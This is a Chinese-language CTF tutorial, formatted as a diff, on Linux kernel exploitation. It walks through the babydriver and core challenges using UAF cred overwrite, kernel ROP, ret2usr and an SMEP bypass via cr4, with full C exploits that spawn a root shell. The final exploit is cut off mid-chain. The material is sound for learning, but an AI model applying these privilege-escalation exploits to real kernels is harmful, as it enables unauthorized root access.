+<h2 id="内核态函数">内核态函数</h2>
+<p>运行在内核态的函数会和用户态有些许不同</p>
+<p><code>printf</code> -&gt; <code>kprintf</code></p>
+<p><code>memcpy</code> -&gt; <code>copy_to_user / copy_from_user</code></p>
+<p>内核并没有用到libc，他的堆分配器是SLAB或SLUB。使用的函数如下：</p>
+<p><code>malloc</code> -&gt; <code>kmalloc</code></p>
+<p><code>free</code> -&gt; <code>kfree</code></p>
+<p>为了安全考虑，内核态也只能运行内核态的函数（smep），想要运行<code>system</code>等函数，必须手动切换回用户态。</p>
+<p>常用的指令是<code>swapgs</code>和<code>iretq</code></p>
+<p>然后需要在栈上存一些上下文：</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/07/01/ce03900db8e55.png" alt="1656659457054.png" loading="lazy"></figure>
+<h2 id="gdb调试">GDB调试</h2>
+<p>以babydriver这题为例，先使用脚本<code>extract-vmlinux</code>提取出带符号的源码</p>
+<pre><code class="language-shell">./extract-vmlinux ./bzImage &gt; ./vmlinux
+</code></pre>
+<p>(脚本源码: <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a>)</p>
+<p>(或者用这个<a href="https://github.com/marin-m/vmlinux-to-elf">https://github.com/marin-m/vmlinux-to-elf</a>)</p>
+<p>在qemu中找到babydriver.ko代码段的起始地址</p>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/06/28/2725c5c2e8829.png" alt="1656428815032.png" loading="lazy"></figure>
+<p>启动gdb过后导入符号表</p>
+<pre><code class="language-shell">add-symbol-file ./lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/06/28/f0eb41e0edef0.png" alt="1656428914178.png" loading="lazy"></figure>
+<p>然后在<code>boot.sh</code>中添加以下参数</p>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/06/28/7c7fdaf78e503.png" alt="1656428999671.png" loading="lazy"></figure>
+<p>重新启动qemu过后，gdb远程连接</p>
+<pre><code class="language-shell">pwndbg&gt; target remote 127.0.0.1:1234
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/06/28/692a481ba37f4.png" alt="1656429252999.png" loading="lazy"></figure>
+<h1 id="attack">ATTACK</h1>
+<p>结合几个例题讲一些比较基础的攻击方式，进阶的会在之后单独写文章整理。</p>
+<h2 id="kernel-uaf">Kernel UAF</h2>
+<h3 id="babydriver">babydriver</h3>
+<h4 id="分析">分析</h4>
+<p>这是ciscn2017年的一道经典kernel pwn入门题。</p>
+<p>解压<code>rootfs.cpio</code>后，在<code>/lib/modules/4.4.72</code>中找到了LKM文件<code>babydriver.ko</code></p>
+<p>检查只开了nx，且没有去除符号表，很方便调试和分析</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/06/28/d06ed40ae130b.png" alt="1656430021780.png" loading="lazy"></figure>
+<p>直接丢ida分析</p>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/06/28/9bb9072a2f512.png" alt="1656429600785.png" loading="lazy"></figure>
+<p>在<code>babyrelease</code>中kfree()之后没有将<code>babydev_struct.device_buf</code>清空，从而导致了uaf漏洞</p>
+<p>而且babydev_struct是一个<code>babydevice_t</code>类型的公共变量，结构如下。</p>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/06/28/999bcbfa67bcb.png" alt="1656430158209.png" loading="lazy"></figure>
+<p><code>device_buf</code>应该是存一个缓冲区的指针，<code>device_buf_len</code>存该缓冲区大小。</p>
+<p>其他的函数都很常规</p>
+<p>babyopen在打开一个设备的时候简单设置了一下<code>babydev_struct</code>的值</p>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/06/28/367539caf2d3c.png" alt="1656430290592.png" loading="lazy"></figure>
+<p>babywrite和babyread都只检查了一下buf指针是否为空</p>
+<figure data-type="image" tabindex="10"><img src="https://img.le1a.com/2022/06/28/a4ec35d250ff7.png" alt="1656430340023.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://img.le1a.com/2022/06/28/8215c8924f9c0.png" alt="1656430434437.png" loading="lazy"></figure>
+<p>babyioctl比较有意思，当第二个参数<code>command</code>为<code>0x10001</code>时，可以修改<code>babydev_struct</code>的<code>device_buf_len</code>为一个确定值。</p>
+<figure data-type="image" tabindex="12"><img src="https://img.le1a.com/2022/06/28/9d5b908092a28.png" alt="1656430504346.png" loading="lazy"></figure>
+<p>至此，利用思路已经非常明显了。</p>
+<p>由于<code>babydev_struct</code>只存在一个，且调用到<code>babyrelease</code>的时候有uaf漏洞，我们可以open两个设备，然后使用<code>babyioctl</code>将<code>babydev_struct.device_buf_len</code>改成<code>cred</code>结构体的大小之后free掉，造成第二个设备存在一个悬挂指针。</p>
+<p>此时再fork()一个新线程，由于kernel的内存分配器采用的是SLAB或SLUB，之前释放掉的那个和cred结构体相同大小的堆块会直接当成这个线程的cred被申请。</p>
+<p>在这个进程中使用babywrite，便可将cred的gid和uid都设置为0</p>
+<p>写好exp过后，由于rootfs.cpio里并没有libc，所以编译的时候要使用静态编译</p>
+<pre><code class="language-shell">gcc exp.c -o exp -static
+</code></pre>
+<p>然后重新打包文件系统，并修改<code>boot.sh</code>中<code>-initrd</code>参数为新打包好的文件系统。</p>
+<p>此时再打开qemu，运行exp过后便可提权成功。</p>
+<figure data-type="image" tabindex="13"><img src="https://img.le1a.com/2022/06/28/78ad9588092b6.png" alt="1656409433808.png" loading="lazy"></figure>
+<h4 id="exp">exp</h4>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/wait.h&gt;
+#include&lt;sys/stat.h&gt;
+int main(){
+	int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);
+	int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);
+
+	ioctl(fd1, 0x10001, 0xa8);
+
+	close(fd1);
+	int id = fork();
+	if(id&lt;0){
+		printf(&quot;fork error!\n&quot;);
+		exit(-1);
+	}
+	else if(id==0){
+		char cred[0x20] = {0};
+		write(fd2, cred, 0x1c);
+		if(getuid()==0){
+			system(&quot;/bin/sh&quot;);
+			exit(0);
+		}
+	}
+	else{
+		wait(NULL);
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="kernel-rop">Kernel ROP</h2>
+<h3 id="core">core</h3>
+<h4 id="分析-2">分析</h4>
+<p>题目给出了<code>bzImage</code>, <code>core.cpio</code>, <code>start.sh</code>, <code>vmlinux</code>四个文件。</p>
+<p>先将core.cpio解包</p>
+<p>发现除了常规文件以外，还多了一个<code>gen_cpio.sh</code></p>
+<p>内容如下：</p>
+<pre><code class="language-shell">find . -print0 \
+| cpio --null -ov --format=newc \
+| gzip -9 &gt; $1
+</code></pre>
+<p>这是一个快速打包用的批处理文件。</p>
+<p>看看<code>start.sh</code></p>
+<pre><code class="language-shell">qemu-system-x86_64 \
+-m 64M \
+-kernel ./bzImage \
+-initrd  ./core.cpio \
+-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \
+-s \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic  \
+</code></pre>
+<p>开启了kaslr保护，并且用<code>-s</code>为gdb开了端口，所以不需要再<code>-gdb tcp::1234</code>开了。</p>
+<p>不过他设置的64M内存不是很够用，我最终设置到了256M才能启动。</p>
+<p>然后分析<code>init</code></p>
+<pre><code class="language-shell">#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs none /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+cat /proc/kallsyms &gt; /tmp/kallsyms
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+ifconfig eth0 up
+udhcpc -i eth0
+ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2
+insmod /core.ko
+
+poweroff -d 120 -f &amp;
+setsid /bin/cttyhack setuidgid 1000 /bin/sh
+echo 'sh end!\n'
+umount /proc
+umount /sys
+
+poweroff -d 0  -f
+</code></pre>
+<p>比较特殊的地方就是将<code>/proc/sys/kernel/kptr_restrict</code>和<code>/proc/sys/kernel/dmesg_restrict</code>的内容设为了<code>1</code>，如此一来，就无法通过<code>dmesg</code>和查看<code>/proc/kallsyms</code>来获取函数地址了。</p>
+<p>好在他前面有一行</p>
+<pre><code class="language-shell">cat /proc/kallsyms &gt; /tmp/kallsyms
+</code></pre>
+<p>将<code>kallsyms</code>备份到了<code>tmp</code>文件夹下。</p>
+<p>然后之后设置了<code>poweroff -d 120 -f</code>，这句比较影响之后的调试，可以直接删掉，或者把时间改长一点。</p>
+<p>我最终修改过后的<code>init</code>文件如下</p>
+<figure data-type="image" tabindex="14"><img src="https://img.le1a.com/2022/07/01/a5fd717bfffa2.png" alt="1656660410311.png" loading="lazy"></figure>
+<p>将core的.text节地址备份出来是为了方便后续gdb加载symbol文件。</p>
+<p>而且这个<code>/sys/module/core/sections/.text</code>是只有<code>root</code>能读的，直接备份出来比较省事，当然也可以直接修改成<code>root</code>启动。</p>
+<p>此外，为了方便后续打包和调试，我还写了两个批处理文件</p>
+<pre><code class="language-shell">root@ubuntu:/home/kotori/Desktop/core# cat pack.sh
+rm ./core.cpio
+./gen_cpio.sh ./core.cpio
+chmod 777 ./core.cpio
+root@ubuntu:/home/kotori/Desktop/core# cat mkc.sh
+gcc ./exp.c -o exp --static -masm=intel
+chmod 777 ./exp
+sudo ./pack.sh
+</code></pre>
+<p>接下来就是分析<code>core.ko</code>的漏洞了</p>
+<figure data-type="image" tabindex="15"><img src="https://img.le1a.com/2022/07/01/6c4ec1abbc3b6.png" alt="1656661302116.png" loading="lazy"></figure>
+<p>开启了canary和nx。</p>
+<p><code>init_module()</code>和<code>exit_core()</code>分别注册和删除了<code>/proc/core</code>，<code>core_release()</code>什么都没做，这里对它们不作分析。</p>
+<figure data-type="image" tabindex="16"><img src="https://img.le1a.com/2022/07/01/f9c397121a837.png" alt="1656660878519.png" loading="lazy"></figure>
+<p><code>core_ioctl</code>中定义了三种操作，分别是调用<code>core_read()</code>，设置全局变量<code>off</code>，调用<code>core_copy_func()</code>。</p>
+<figure data-type="image" tabindex="17"><img src="https://img.le1a.com/2022/07/01/685c6d6523963.png" alt="1656660988262.png" loading="lazy"></figure>
+<p><code>core_read</code>可以将距离<code>rsp</code>偏移为<code>off</code>的值往后拷贝0x40个字节给指定缓冲区。</p>
+<p>这里利用<code>off</code>是可以读出canary的。</p>
+<figure data-type="image" tabindex="18"><img src="https://img.le1a.com/2022/07/01/bf0440abb943c.png" alt="1656661927949.png" loading="lazy"></figure>
+<p><code>core_write</code>是将至多0x800个字节从指定缓冲区复制到<code>name</code>中去。</p>
+<figure data-type="image" tabindex="19"><img src="https://img.le1a.com/2022/07/01/00d8c1a0705df.png" alt="1656662083268.png" loading="lazy"></figure>
+<p>这个<code>core_copy_func</code>则是整个LKM最大的漏洞点。当长度参数<code>a1</code>小于等于63时，便可将<code>name</code>中对应字节数的数据复制到栈上变量<code>v2</code>中去，且<code>a1</code>和63作比较时是有符号数，最后调用<code>qmemcpy</code>时转成了<code>unsigned __int16</code>。所以只需要将<code>a1</code>最低两个字节的数据随便设置成一个能装下<code>name</code>的长度，然后其余字节都是<code>0xff</code>就行了。我这里最后构造的<code>a1</code>是<code>0xffffffffffff0100</code>。</p>
+<p>所以整个攻击流程如下：</p>
+<ol>
+<li>设置好<code>off</code>去读出canary的值</li>
+<li>布置好rop之后调用<code>core_write</code>将rop写入<code>name</code>中</li>
+<li>调用<code>core_copy_func</code>，将<code>name</code>的内容写入栈上变量<code>v2</code>中，造成栈溢出，调用<code>commit_creds(prepare_kernel_cred(0))</code>提权。</li>
+</ol>
+<p>当然，在写rop之前，还有一个小小的问题需要解决。那就是解决kaslr和pie带来的偏移问题。</p>
+<figure data-type="image" tabindex="20"><img src="https://img.le1a.com/2022/07/01/9a853014fb787.png" alt="1656662655234.png" loading="lazy"></figure>
+<p>原始无pie的vmlinux基址是<code>0xffffffff81000000</code></p>
+<p><code>commit_creds</code>的地址是<code>0xffffffff81000000+0x9c8e0</code></p>
+<p><code>prepare_kernel_creds</code>的地址是<code>0xffffffff8109cce0</code></p>
+<p>包括后续找到的gadgets的地址，这些全是no-pie情况下的地址，我们还需要知道真正运行起来的时候与之的偏移。</p>
+<p>这个其实就可以直接在<code>/tmp/kallsyms</code>中，利用他给出的<code>commit_creds</code>或<code>prepare_kernel_cred</code>此时的地址来计算出来。</p>
+<pre><code class="language-c">size_t leak_vmlinux_base(){
+	FILE* fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);
+	if(fd==NULL){
+		puts(&quot;[-] open file failed.&quot;);
+		exit(-1);
+	}
+	char buf[0x40] = {0};
+	while(fgets(buf, 0x30, fd)!=NULL){
+		if(strstr(buf, &quot;commit_creds&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;commit_creds);
+			printf(&quot;[+] commit_creds: 0x%lx\n&quot;, commit_creds);
+			prepare_kernel_cred = commit_creds-0x9c8e0+0x9cce0;
+			fclose(fd);
+			return commit_creds-0x9c8e0;
+		}
+		else if(strstr(buf, &quot;prepare_kernel_cred&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;prepare_kernel_cred);
+			printf(&quot;[+] prepare_kernel_cred: 0x%lx\n&quot;, prepare_kernel_cred);
+			commit_creds = prepare_kernel_cred-0x9cce0+0x9c8e0;
+			fclose(fd);
+			return prepare_kernel_cred-0x9cce0;
+		}
+	}
+	fclose(fd);
+	return 0;
+}
+</code></pre>
+<p>gadgets的预处理可以用ropper解决（ROPgadget太慢了）</p>
+<pre><code class="language-shell">ropper --file ./vmlinux --nocolor &gt; g
+</code></pre>
+<p>至于rop的构思的话就非常简单了，先摆好rdi为0，然后调用<code>prepare_kernel_cred</code>，此时返回值会在rax中，如果有<code>mov rdi, rax; ret</code>的话将绝杀，可惜没有。</p>
+<p>不过好在有类似的好几个，我选择了<code>mov rdi, rax; jmp rcx;</code></p>
+<p>如果在这之前将rcx摆好<code>commit_creds</code>就很方便了。</p>
+<p>然后切换回用户态，<code>iretq; ret</code>是有的，swapgs就只有<code>swapgs; popfq; ret;</code>，所以后面要跟一个垃圾数据平衡一下栈。</p>
+<p>最后按照rip, cs, rflags, rsp, ss的顺序摆好之前用户态的寄存器就好了。</p>
+<h4 id="exp-2">exp</h4>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;sys/types.h&gt;
+#include&lt;sys/ioctl.h&gt;
+size_t u_cs, u_rflags, u_rsp, u_ss;
+size_t commit_creds, prepare_kernel_cred;
+void save_status(){
+	__asm__(&quot;mov u_cs, cs;&quot;
+		&quot;pushf;&quot;
+		&quot;pop u_rflags;&quot;
+		&quot;mov u_rsp, rsp;&quot;
+		&quot;mov u_ss, ss;&quot;
+	);
+}
+void set_off(int fd, int offset){
+	ioctl(fd, 0x6677889c, offset);
+}
+size_t leak_canary(int fd){
+	size_t temp[0x10] = {0};
+	set_off(fd, 0x40);
+	ioctl(fd, 0x6677889b, temp);
+	return temp[0];
+}
+size_t leak_vmlinux_base(){
+	FILE* fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);
+	if(fd==NULL){
+		puts(&quot;[-] open file failed.&quot;);
+		exit(-1);
+	}
+	char buf[0x40] = {0};
+	while(fgets(buf, 0x30, fd)!=NULL){
+		if(strstr(buf, &quot;commit_creds&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;commit_creds);
+			printf(&quot;[+] commit_creds: 0x%lx\n&quot;, commit_creds);
+			prepare_kernel_cred = commit_creds-0x9c8e0+0x9cce0;
+			fclose(fd);
+			return commit_creds-0x9c8e0;
+		}
+		else if(strstr(buf, &quot;prepare_kernel_cred&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;prepare_kernel_cred);
+			printf(&quot;[+] prepare_kernel_cred: 0x%lx\n&quot;, prepare_kernel_cred);
+			commit_creds = prepare_kernel_cred-0x9cce0+0x9c8e0;
+			fclose(fd);
+			return prepare_kernel_cred-0x9cce0;
+		}
+	}
+	fclose(fd);
+	return 0;
+}
+void get_root_shell(){
+		if(getuid()==0)
+			system(&quot;/bin/sh&quot;);
+		else{
+			puts(&quot;[-] get root shell failed.&quot;);
+			exit(-1);
+		}
+}
+void rop(int fd, size_t canary, size_t offset){
+	size_t name[0x100] = {0};
+	//----gadgets----
+	size_t pop_rdi = 0xffffffff81000b2f; // pop rdi; ret;
+	size_t mov_rdi_rax_jmp_rcx = 0xffffffff811ae978; // mov rdi, rax; jmp rcx;
+	size_t pop_rcx = 0xffffffff81021e53; // pop rcx; ret;
+	size_t swapgs_popfq =  0xffffffff81a012da; // swapgs; popfq; ret;
+	size_t iretq  =  0xffffffff81050ac2; // iretq; ret;
+	int idx = 0;
+	for(idx=0;idx&lt;10;idx++)
+		name[idx] = canary;
+	name[idx++] = pop_rdi + offset;
+	name[idx++] = 0;
+	name[idx++] = prepare_kernel_cred;
+	name[idx++] = pop_rcx + offset;
+	name[idx++] = commit_creds;
+	name[idx++] = mov_rdi_rax_jmp_rcx + offset;
+	name[idx++] = swapgs_popfq + offset;
+	name[idx++] = 0;
+	name[idx++] = iretq + offset;
+	name[idx++] = (size_t)get_root_shell; //rip
+	name[idx++] = u_cs;
+	name[idx++] = u_rflags;
+	name[idx++] = u_rsp;
+	name[idx++] = u_ss;
+	write(fd, name, 0x800);
+	puts(&quot;[+] rop loaded.&quot;);
+	ioctl(fd, 0x6677889a, (0xffffffffffff0100));
+}
+int main(){
+	save_status();
+	int fd = open(&quot;/proc/core&quot;, O_RDWR);
+	size_t canary = leak_canary(fd);
+	printf(&quot;[+] canary: 0x%lx\n&quot;, canary);
+	size_t vmlinux_base = leak_vmlinux_base();
+	if(!vmlinux_base){
+		printf(&quot;[-] leak base failed.\n&quot;);
+		exit(-1);
+	}
+	size_t vmlinux_base_no_pie = 0xffffffff81000000;
+	size_t offset = vmlinux_base - vmlinux_base_no_pie;
+	printf(&quot;[+] offset: 0x%lx\n&quot;, offset);
+	rop(fd, canary, offset);
+	return 0;
+}
+</code></pre>
+<h2 id="smep-ret2usr">SMEP &amp; ret2usr</h2>
+<h3 id="再看core">再看core</h3>
+<p>之前使用kernel rop的方法打下来了core这道题。但其实，默认情况下，虽然内核态的函数在用户空间下是无法运行的，但用户态的函数在内核空间却可以运行，因此我们可以在用户空间构造好<code>commit_creds(prepare_kernel_cred(0))</code>，然后在内核空间以<code>ring 0</code>权限来运行它。</p>
+<p>利用这一点，可以对core的exp作出局部调整：</p>
+<ul>
+<li>加入<code>get_root</code>函数</li>
+</ul>
+<pre><code class="language-c">void get_root(){
+	void* (*cc)(char *) = commit_creds;
+	char* (*pkc)(int) = prepare_kernel_cred;
+	(*cc)((*pkc)(0)); // commit_creds(prepare_kernel_cred(0));
+}
+</code></pre>
+<ul>
+<li>修改rop</li>
+</ul>
+<pre><code class="language-c">for(idx=0;idx&lt;10;idx++)
+	name[idx] = canary;
+/*
+name[idx++] = pop_rdi + offset;
+name[idx++] = 0;
+name[idx++] = prepare_kernel_cred;
+name[idx++] = pop_rcx + offset;
+name[idx++] = commit_creds;
+name[idx++] = mov_rdi_rax_jmp_rcx + offset;
+*/
+name[idx++] = (size_t)get_root;
+name[idx++] = swapgs_popfq + offset;
+name[idx++] = 0;
+name[idx++] = iretq + offset;
+name[idx++] = (size_t)get_root_shell; //rip
+name[idx++] = u_cs;
+name[idx++] = u_rflags;
+name[idx++] = u_rsp;
+name[idx++] = u_ss;
+</code></pre>
+<p>仍然可以成功提权。</p>
+<figure data-type="image" tabindex="21"><img src="https://img.le1a.com/2022/07/05/77d36b4a3969e.png" alt="1657007842316.png" loading="lazy"></figure>
+<h3 id="smep">SMEP</h3>
+<h4 id="introduction">Introduction</h4>
+<p>smep保护使得内核态也只能访问内核空间的代码了，因此直接ret2usr会失败。</p>
+<p>不过是否开启smep保护是记录在<code>cr4</code>寄存器上的。</p>
+<p><code>cr4</code>寄存器的第20位为<code>1</code>时SMEP就视为开启，为<code>0</code>则视为关闭。</p>
+<figure data-type="image" tabindex="22"><img src="https://img.le1a.com/2022/07/05/a0ce8cef963b0.png" alt="1657008988963.png" loading="lazy"></figure>
+<h4 id="bypass">Bypass</h4>
+<p>既然知道了判断是否开启smep的机制，那么bypass思路也很清晰了。只需要利用某些gadgets来修改cr4寄存器的值即可。（通常改成0x6f0，同时关闭smep和smap。不过控制cr4的gadgets在高版本无了）</p>
+<h3 id="resolve-babydriver">REsolve: babydriver</h3>
+<h4 id="分析-3">分析</h4>
+<p>这里用ret2usr的方法再解决一遍babydriver这道题。</p>
+<figure data-type="image" tabindex="23"><img src="https://img.le1a.com/2022/07/05/cf6def5fb9eec.png" alt="1657008777085.png" loading="lazy"></figure>
+<p>查看<code>boot.sh</code>，发现开启了smep。</p>
+<p>所以我们需要用rop来关闭smep，然后再ret2usr提权。</p>
+<p>可是这道题的洞是uaf，如何达成rop的目的呢？这里就需要用到<code>tty_struct</code>和<code>tty_operation</code>这两个结构体了。</p>
+<p>他们的原型分别如下：</p>
+<pre><code class="language-c">struct tty_struct {
+    int magic;
+    struct kref kref;
+    struct device *dev;
+    struct tty_driver *driver;
+    const struct tty_operations *ops;
+    int index;
+    /* Protects ldisc changes: Lock tty not pty */
+    struct ld_semaphore ldisc_sem;
+    struct tty_ldisc *ldisc;
+    struct mutex atomic_write_lock;
+    struct mutex legacy_mutex;
+    struct mutex throttle_mutex;
+    struct rw_semaphore termios_rwsem;
+    struct mutex winsize_mutex;
+    spinlock_t ctrl_lock;
+    spinlock_t flow_lock;
+    /* Termios values are protected by the termios rwsem */
+    struct ktermios termios, termios_locked;
+    struct termiox *termiox;    /* May be NULL for unsupported */
+    char name[64];
+    struct pid *pgrp;       /* Protected by ctrl lock */
+    struct pid *session;
+    unsigned long flags;
+    int count;
+    struct winsize winsize;     /* winsize_mutex */
+    unsigned long stopped:1,    /* flow_lock */
+              flow_stopped:1,
+              unused:BITS_PER_LONG - 2;
+    int hw_stopped;
+    unsigned long ctrl_status:8,    /* ctrl_lock */
+              packet:1,
+              unused_ctrl:BITS_PER_LONG - 9;
+    unsigned int receive_room;  /* Bytes free for queue */
+    int flow_change;
+    struct tty_struct *link;
+    struct fasync_struct *fasync;
+    wait_queue_head_t write_wait;
+    wait_queue_head_t read_wait;
+    struct work_struct hangup_work;
+    void *disc_data;
+    void *driver_data;
+    spinlock_t files_lock;      /* protects tty_files list */
+    struct list_head tty_files;
+#define N_TTY_BUF_SIZE 4096
+    int closing;
+    unsigned char *write_buf;
+    int write_cnt;
+    /* If the tty has a pending do_SAK, queue it here - akpm */
+    struct work_struct SAK_work;
+    struct tty_port *port;
+} __randomize_layout;
+</code></pre>
+<pre><code class="language-c">struct tty_operations {
+    struct tty_struct * (*lookup)(struct tty_driver *driver,
+            struct file *filp, int idx);
+    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+    int  (*open)(struct tty_struct * tty, struct file * filp);
+    void (*close)(struct tty_struct * tty, struct file * filp);
+    void (*shutdown)(struct tty_struct *tty);
+    void (*cleanup)(struct tty_struct *tty);
+    int  (*write)(struct tty_struct * tty,
+              const unsigned char *buf, int count);
+    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+    void (*flush_chars)(struct tty_struct *tty);
+    int  (*write_room)(struct tty_struct *tty);
+    int  (*chars_in_buffer)(struct tty_struct *tty);
+    int  (*ioctl)(struct tty_struct *tty,
+            unsigned int cmd, unsigned long arg);
+    long (*compat_ioctl)(struct tty_struct *tty,
+                 unsigned int cmd, unsigned long arg);
+    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+    void (*throttle)(struct tty_struct * tty);
+    void (*unthrottle)(struct tty_struct * tty);
+    void (*stop)(struct tty_struct *tty);
+    void (*start)(struct tty_struct *tty);
+    void (*hangup)(struct tty_struct *tty);
+    int (*break_ctl)(struct tty_struct *tty, int state);
+    void (*flush_buffer)(struct tty_struct *tty);
+    void (*set_ldisc)(struct tty_struct *tty);
+    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+    void (*send_xchar)(struct tty_struct *tty, char ch);
+    int (*tiocmget)(struct tty_struct *tty);
+    int (*tiocmset)(struct tty_struct *tty,
+            unsigned int set, unsigned int clear);
+    int (*resize)(struct tty_struct *tty, struct winsize *ws);
+    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+    int (*get_icount)(struct tty_struct *tty,
+                struct serial_icounter_struct *icount);
+    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
+#ifdef CONFIG_CONSOLE_POLL
+    int (*poll_init)(struct tty_driver *driver, int line, char *options);
+    int (*poll_get_char)(struct tty_driver *driver, int line);
+    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+#endif
+    int (*proc_show)(struct seq_file *, void *);
+} __randomize_layout;
+</code></pre>
+<p>在<code>tty_struct</code>中有<code>const struct tty_operations *ops;</code></p>
+<p>因此如果可以伪造出一个<code>tty_struct</code>，使它的<code>*ops</code>指向一个伪造出来的<code>tty_operation</code>，即可利用<code>write</code>和<code>ioctl</code>这些函数来劫持程序执行流程。</p>
+<p>由于不熟悉结构体，我这里是先把tty_operation的内容布置成了比较有规律的样子，然后利用报错计算偏移</p>
+<pre><code class="language-c">size_t fake_tty_operation[0x20] = {
+    			0xffffffff00000000,
+				0xffffffff00000001,
+				0xffffffff00000002,
+				0xffffffff00000003,
+				0xffffffff00000004,
+				0xffffffff00000005,
+				0xffffffff00000006,
+				0xffffffff00000007,
+				0xffffffff00000008,
+				0xffffffff00000009,
+				0xffffffff0000000a,
+				0xffffffff0000000b,
+				0xffffffff0000000c
+};
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://img.le1a.com/2022/10/17/390168f94bb72.png" alt="1665991784472.png" loading="lazy"></figure>
+<p>一闪而过的报错中，可以看出来babywrite是被劫持到了<code>tty_operation[7]</code>这个位置，所以直接从这里开始劫持控制流。</p>
+<p>想要完成内核rop，此时肯定需要控制一下rsp的位置，有一个比较好用的gadget：</p>
+<pre><code class="language-assembly">0xffffffff8181bfc5: mov rsp, rax; dec ebx; jmp 0xffffffff8181bf7e;
+0xffffffff8181bf7e: ret;
+</code></pre>
+<p>经过调试，发现此时rax的值刚好是这个<code>tty_operation</code>结构体的首地址</p>
+<p>所以此时有两个思路：</p>
+<pre><code>1. 复用一次0xffffffff8181bfc5这里的gadget，把rsp劫持到用户态的rop那里去
+2. 直接在tty_operation里rop，但是要注意一下绕过tty_operation[7]
+</code></pre>
+<p>不管用哪个，最终都能成功劫持程序流完成ret2usr。（由于一些原因，我还是选择了第二种方式）</p>
+<p>不过有一个问题，使用这题原生的内核版本4.4.72会出现<code>PANIC: double fault, error_code: 0x0</code>这样的报错，<del>所以需要换内核版本运行，这里就不过多讨论了。</del></p>
+<p>查了一些资料过后，发现很可能是<code>KPTI</code>保护机制的问题，在尝试关闭<code>KPTI</code>无果之后，发现其实可以通过对特定<code>signal</code>的处理来继续完成利用，比如说<code>KPTI</code>机制这里会抛出的11号信号，给他处理成<code>get_root_shell</code>这个函数就行了，因为在这之前已经完成了bypass smep和<code>prepare_kernel_cred(commit_creds(0))</code>的操作。</p>
+<h4 id="exp-3">exp</h4>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;sys/types.h&gt;
+#include&lt;sys/ioctl.h&gt;
+
+size_t usr_cs, usr_rflags, usr_rsp, usr_ss;
+void save_status(){
+	__asm__(&quot;mov usr_cs, cs;&quot;
+		&quot;pushf;&quot;
+		&quot;pop usr_rflags;&quot;
+		&quot;mov usr_rsp, rsp;&quot;
+		&quot;mov usr_ss, ss;&quot;
+	);
+}
+void get_root(){
+	char* (*pkc)(int) = 0xffffffff810a1810; // prepare_kernel_cred;
+	void* (*cc)(char*) = 0xffffffff810a1420; // commit_creds;
+	(*cc)((*pkc)(0));
+}
+void get_root_shell(){
+	if(getuid()!=0){
+		puts(&quot;[-] get root failed.&quot;);
+		exit(-1);
+	}
+	system(&quot;/bin/sh&quot;);
+}
+int main(){
+	save_status();
+	signal(11, (size_t)get_root_shell);
+	
+	int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);
+	int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);
+	ioctl(fd1, 0x10001, 0x2e0);
+	close(fd1);  // uaf
+	size_t rop[0x30] = {0};
+	int i = 0;
+	rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
+	rop[i++] = 0x6f0; // bypass smep
+	rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
+	rop[i++] = 0;
